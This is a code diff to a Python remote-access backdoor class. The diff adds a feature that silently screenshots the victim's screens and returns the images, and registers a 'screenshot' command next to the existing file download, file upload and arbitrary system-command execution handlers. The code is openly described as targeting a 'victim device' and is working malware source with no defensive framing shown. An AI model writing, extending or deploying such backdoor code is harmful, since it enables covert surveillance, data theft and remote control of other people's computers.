@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket, subprocess, json, os, base64, shutil, sys
+import socket, subprocess, json, os, base64, shutil, sys, mss
 
 class Backdoor:
     # Backdoor class
@@ -59,11 +59,21 @@ class Backdoor:
             return base64.b64encode(file.read()).decode()
 
     def write_file(self, file_path, file_data):
-    # Method writing data to file
+        # Method writing data to file
         with open(file_path, 'wb') as file:
             file.write(base64.b64decode(file_data))
             return '[+] Upload successful.'
-        
+    
+    def screenshot(self):
+        # Screenshot whole screens of victim device
+        with mss.mss() as scr:
+            scr.shot(output = 'screen.png')
+            data = self.read_file('screen.png')
+            if os.path.exists('screen.png'):
+                os.remove('screen.png')
+            return data
+
+
     def run(self):
         # Method which run everythong - receiving, sending, executing, etc.
         while True:
@@ -78,6 +88,8 @@ class Backdoor:
                     command_result = self.read_file(command[1])
                 elif command[0] == 'upload':
                     command_result = self.write_file(command[1], command[2])
+                elif command[0] == 'screenshot':
+                    command_result = self.screenshot()
                 else:
                     command_result = self.execute_system_command(command)
             except Exception:
